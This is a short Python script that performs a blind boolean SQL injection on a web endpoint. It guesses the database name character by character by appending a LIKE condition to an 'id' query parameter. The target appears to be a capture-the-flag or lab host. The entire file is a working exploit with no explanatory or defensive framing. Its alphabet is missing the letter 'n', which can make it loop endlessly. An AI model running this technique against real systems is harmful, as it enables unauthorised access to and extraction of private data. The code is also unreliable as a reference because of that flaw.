import requests

url = "http://34.74.105.127/3bae04756d/"


db_name = ""
db_name_length = 6

alphabet="abcdefghijklmopqrstuvwxyz0123456789"

while len(db_name) != db_name_length:
	for char in alphabet:
		req = requests.get(url + "fetch?id=1 AND database() LIKE '" + db_name + char + ("_" * (db_name_length - len(db_name) - 1)) + "'")

		if req.status_code != 404:
			db_name += char
			print(db_name)
			break